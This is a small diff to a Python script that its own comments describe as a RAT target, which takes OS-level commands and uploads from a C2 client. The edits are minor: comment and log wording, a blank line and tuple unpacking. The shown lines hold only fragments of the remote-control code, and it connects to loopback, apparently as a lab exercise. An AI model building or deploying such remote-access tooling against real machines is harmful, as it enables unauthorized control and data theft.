@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# Purpose: RAT server. This script will provide an interface where the client (C2 server) will receive, upload, and control the server with OS level commands.
+# Purpose: RAT Target. This script will provide an interface where the client (C2 server) will receive, upload, and control the target with OS level commands.
 # Author: Israel Fernandez
 # Date of creation: April 7, 2026
 
@@ -10,6 +10,7 @@ import base64
 import socket
 import struct
 import subprocess
+
 
 
 HOST = "127.0.0.1"  # Loopback
@@ -107,7 +108,7 @@ def send(command, payload, session):
     return 0
 
 def recv(session):
-    (_, addr) = session
+    _, addr = session
     raw_length = _receive_all(session, HEADER_SIZE)
     if raw_length is None:
         return None
@@ -176,7 +177,7 @@ def execute(payload, session):
 
 
 def main():
-    log(f"Starting RAT Server...")
+    log(f"Starting RAT...")
     while True:
         session = connect()
         if session is None:
